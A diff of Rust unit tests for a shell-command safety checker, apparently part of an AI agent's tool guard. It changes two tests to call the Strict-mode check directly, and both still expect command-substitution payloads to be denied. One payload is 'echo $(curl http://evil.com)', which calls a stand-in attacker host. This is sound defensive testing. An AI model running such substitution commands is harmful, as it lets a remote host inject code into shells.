@@ -1776,16 +1776,17 @@ mod tests {
 
     #[test]
     fn middleware_blocks_unsafe_command_substitution() {
-        // curl is not in the safe whitelist
-        let decision = evaluate_tool_safety_request(
-            "bash",
-            &json!({"command": "echo $(curl http://evil.com)"}),
+        // curl is not in the safe whitelist — test with explicit Strict mode to
+        // avoid depending on the process-global trust mode.
+        let reason =
+            check_shell_command_safety_with_mode("echo $(curl http://evil.com)", TrustMode::Strict);
+        assert!(
+            reason
+                .as_deref()
+                .unwrap_or("")
+                .contains("command substitution"),
+            "expected command substitution denial, got: {reason:?}"
         );
-        assert!(matches!(
-            decision,
-            SafetyMiddlewareDecision::Deny(reason)
-                if reason.contains("shell_obfuscation") && reason.contains("command substitution")
-        ));
     }
 
     #[test]
@@ -1820,14 +1821,18 @@ mod tests {
 
     #[test]
     fn middleware_blocks_backtick_command_substitution() {
-        // Backticks are always blocked regardless of command
-        let decision =
-            evaluate_tool_safety_request("bash", &json!({"command": "echo `cat file.txt`"}));
-        assert!(matches!(
-            decision,
-            SafetyMiddlewareDecision::Deny(reason)
-                if reason.contains("shell_obfuscation") && reason.contains("command substitution")
-        ));
+        // Backticks are always blocked in Strict mode regardless of command.
+        // Uses check_shell_command_safety_with_mode directly to avoid depending
+        // on the process-global trust mode (which other tests may mutate).
+        let reason =
+            check_shell_command_safety_with_mode("echo `cat file.txt`", TrustMode::Strict);
+        assert!(
+            reason
+                .as_deref()
+                .unwrap_or("")
+                .contains("command substitution"),
+            "expected command substitution denial, got: {reason:?}"
+        );
     }
 
     #[test]
